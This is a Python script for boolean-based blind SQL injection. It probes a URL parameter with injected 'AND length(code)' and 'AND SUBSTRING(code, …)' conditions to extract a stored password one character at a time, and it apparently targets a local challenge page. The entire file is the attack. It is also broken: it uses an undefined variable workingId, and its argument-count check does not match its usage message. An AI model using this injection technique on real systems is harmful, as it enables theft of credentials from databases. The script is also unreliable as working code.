import requests
import string
import sys
import time

def checkURL(url, strCheck):
    #print(url)
    res = requests.get(url)

    if strCheck in res.text:
        return True
    return False


if len(sys.argv) != 5:
    print("Usage :", sys.argv[0], "<URL>", "<SUCCESS STRING>")
    exit(1)

#url = "http://127.0.0.1/trhackers/epreuve14.php"
#param = id
url = sys.argv[1]
msg = sys.argv[2]

print("[+] URL :", url)


password_size = 0
print("[+] Checking password size...")

for x in range(1,50):

    result = checkURL(url + workingId + " AND length(code) >= " + str(x), msg)
    time.sleep(0.2)

    if result:
        password_size = x
        print("[+] Password size : ", password_size, end="\r")
    else:
        break


alpha = string.printable
password = ''

print("\n[+] Retrieving password ...")

for x in range(1, password_size + 1):
    found = False
    time.sleep(0.2)

    for c in alpha:
        param = workingId +" AND SUBSTRING(code," + str(x) + ", 1) = '" + c + "'" 
        result = checkURL(url + param, msg)
        print("[+] Retrieving password :", password + c, end="\r")

        if result:
            found = True
            password += c
            print("[+] Retrieving password :", password, end="\r")
            break

print("\n[+] Password found :", password)

